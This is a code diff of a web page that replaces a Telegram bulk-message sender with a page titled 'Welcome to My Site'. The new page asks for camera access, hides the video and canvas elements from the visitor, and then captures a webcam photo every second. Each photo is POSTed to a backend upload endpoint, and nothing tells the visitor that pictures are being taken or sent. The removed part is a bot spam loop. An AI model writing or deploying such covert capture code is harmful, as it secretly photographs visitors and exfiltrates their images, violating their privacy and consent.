@@ -1,227 +1,80 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Auto Sender Control</title>
+    <title>Welcome to My Site</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            padding: 25px;
-            line-height: 1.7;
-            background-color: #f8f9fa;
-            color: #212529;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            max-width: 600px;
-            width: 90%;
-            text-align: center;
-        }
-        h1 {
-            color: #007bff;
-            margin-bottom: 25px;
-        }
-        .controls button {
-            padding: 12px 25px;
-            font-size: 1.1em;
-            margin: 10px;
-            border-radius: 5px;
-            border: none;
-            cursor: pointer;
-            transition: background-color 0.3s ease, opacity 0.3s ease;
-        }
-        #start-button {
-            background-color: #28a745;
-            color: white;
-        }
-        #start-button:disabled {
-            background-color: #cccccc;
-             opacity: 0.7;
-             cursor: not-allowed;
-        }
-        #stop-button {
-            background-color: #dc3545;
-            color: white;
-        }
-         #stop-button:disabled {
-            background-color: #cccccc;
-             opacity: 0.7;
-            cursor: not-allowed;
-         }
-        .stats {
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid #dee2e6;
-        }
-        .stats p {
-            font-size: 1.2em;
-            margin: 12px 0;
-            color: #495057;
-        }
-        .stats span {
-            font-weight: 600;
-            font-size: 1.4em;
-            display: block;
-            margin-top: 5px;
-        }
-        #success-count { color: #28a745; }
-        #failure-count { color: #dc3545; }
-        #status {
-            margin-top: 20px;
-            font-size: 1em;
-            font-style: italic;
-            color: #6c757d;
-            min-height: 1.5em; /* Reserve space */
-        }
-        .loader { font-style: italic; color: #6c757d; }
-         .warning { font-weight: bold; color: #ffc107; margin-top: 15px; }
-         .error { font-weight: bold; color: #dc3545; }
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        /* Video element ko chupa dega taki user ko na dikhe */
+        #video-preview { display: none; } 
+        canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Telegram Auto Sender</h1>
 
-        <div class="controls">
-            <button id="start-button">Start Sending</button>
-            <button id="stop-button" disabled>Stop Sending</button>
-        </div>
+    <h1>Welcome!</h1>
+    <p id="status">Please wait, starting camera...</p>
 
-        <div id="status">Status: Idle</div>
-
-        <div class="stats">
-             <h2>Live Stats</h2>
-            <p>✅ Total Messages Sent Successfully: <span id="success-count" class="loader">Loading...</span></p>
-            <p>❌ Total Send Attempts Failed: <span id="failure-count" class="loader">Loading...</span></p>
-        </div>
-         <div class="warning">
-             ⚠️ WARNING: Running this for extended periods or at high frequency WILL likely get your bot rate-limited or banned by Telegram. Use with extreme caution.
-         </div>
-    </div>
+    <!-- Video stream yahan aayega -->
+    <video id="video-preview" autoplay></video>
+    <!-- Photo capture karne ke liye Canvas -->
+    <canvas id="canvas"></canvas>
 
     <script>
-        const startButton = document.getElementById('start-button');
-        const stopButton = document.getElementById('stop-button');
-        const successCountEl = document.getElementById('success-count');
-        const failureCountEl = document.getElementById('failure-count');
+        const video = document.getElementById('video-preview');
+        const canvas = document.getElementById('canvas');
         const statusEl = document.getElementById('status');
+        const backendUrl = 'http://localhost:3000/upload'; // Aapka backend server URL
 
-        let sendIntervalId = null; // To store the interval ID for stopping
-        let statsIntervalId = null; // To store the interval ID for fetching stats
-        const SEND_INTERVAL_MS = 1000; // Send attempt every 1 second - VERY RISKY
-        const STATS_INTERVAL_MS = 2000; // Update stats display every 2 seconds
+        // 1. User se Camera access ke liye permission maango
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                statusEl.textContent = "Camera access granted. Capturing photo...";
+                video.srcObject = stream;
+                
+                // Har 1 second mein photo capture karke bhejo
+                // **WARNING: Yeh aapke browser aur server ko slow kar sakta hai!**
+                setInterval(() => {
+                    captureAndSend();
+                }, 1000); // 1000 milliseconds = 1 second
+            })
+            .catch(err => {
+                console.error("Camera access error:", err);
+                statusEl.textContent = "Could not access the camera. Please allow camera permission.";
+                alert("You denied camera access. This site requires camera to function.");
+            });
 
-        // Function to fetch latest stats from backend
-        async function fetchStats() {
-            try {
-                const response = await fetch('/stats');
-                if (!response.ok) {
-                    throw new Error(`Stats fetch failed: ${response.status}`);
-                }
-                const data = await response.json();
-                successCountEl.textContent = data.success;
-                failureCountEl.textContent = data.failed;
-                successCountEl.classList.remove('loader');
-                failureCountEl.classList.remove('loader');
-            } catch (error) {
-                console.error('Error fetching stats:', error);
-                successCountEl.textContent = 'Error';
-                failureCountEl.textContent = 'Error';
-                statusEl.textContent = 'Error fetching stats.';
-                statusEl.classList.add('error');
-            }
+        // 2. Photo capture karke backend ko bhejne wala function
+        function captureAndSend() {
+            const context = canvas.getContext('2d');
+            
+            // Canvas ka size video ke barabar set karo
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Video ka current frame canvas par draw karo
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Canvas se image data ko Base64 format mein nikalo
+            const imageData = canvas.toDataURL('image/jpeg');
+            
+            // 3. Image data ko server par bhejo
+            fetch(backendUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Server response:', data.message);
+            })
+            .catch(error => {
+                console.error('Error sending image to server:', error);
+            });
         }
-
-        // Function to trigger ONE send attempt via backend
-        async function attemptSend() {
-             if (!navigator.onLine) {
-                statusEl.textContent = 'Status: Offline. Paused sending.';
-                statusEl.classList.add('error');
-                // Optionally stop sending automatically when offline
-                // stopSending();
-                return; // Don't attempt send if offline
-             }
-             statusEl.classList.remove('error'); // Clear previous error state
-            try {
-                 // No need to update status here immediately, let fetchStats handle totals
-                 // Optional: Show "Sending..." briefly
-                 // statusEl.textContent = 'Status: Sending request...';
-                const response = await fetch('/send', { method: 'POST' });
-                 if (!response.ok) {
-                     // Handle specific backend errors if needed from response body
-                      statusEl.textContent = `Status: Send request failed (${response.status}).`;
-                      statusEl.classList.add('error');
-                      throw new Error(`Send request failed: ${response.status}`);
-                 }
-                 const resultData = await response.json();
-                 // Optional: Log result of specific attempt
-                 console.log('Send attempt result:', resultData.result);
-                 // The global count is updated on the backend, fetchStats will get it
-                 // statusEl.textContent = `Status: Last attempt to ${resultData.result.chatId} ${resultData.result.success ? 'OK' : 'Failed'}. Running...`;
-
-            } catch (error) {
-                console.error('Error triggering send:', error);
-                // Error is logged, fetchStats will show updated failure count eventually
-                 statusEl.textContent = 'Status: Error during send attempt. Check console.';
-                 statusEl.classList.add('error');
-            }
-        }
-
-        function startSending() {
-            if (sendIntervalId !== null) return; // Already running
-
-            console.log('Starting send loop...');
-            startButton.disabled = true;
-            stopButton.disabled = false;
-            statusEl.textContent = 'Status: Running...';
-             statusEl.classList.remove('error');
-
-            // Immediately attempt one send and fetch stats
-             attemptSend();
-             fetchStats();
-
-
-            // Start the interval for sending
-            sendIntervalId = setInterval(attemptSend, SEND_INTERVAL_MS);
-            // Start the interval for fetching stats
-            statsIntervalId = setInterval(fetchStats, STATS_INTERVAL_MS);
-        }
-
-        function stopSending() {
-            if (sendIntervalId === null) return; // Already stopped
-
-            console.log('Stopping send loop...');
-            clearInterval(sendIntervalId);
-            clearInterval(statsIntervalId);
-            sendIntervalId = null;
-            statsIntervalId = null;
-
-            startButton.disabled = false;
-            stopButton.disabled = true;
-            statusEl.textContent = 'Status: Stopped.';
-            statusEl.classList.remove('error');
-
-            // Fetch final stats
-            fetchStats();
-        }
-
-        // Event Listeners
-        startButton.addEventListener('click', startSending);
-        stopButton.addEventListener('click', stopSending);
-
-        // Initial load: fetch stats once
-        fetchStats();
-
     </script>
 </body>
 </html>
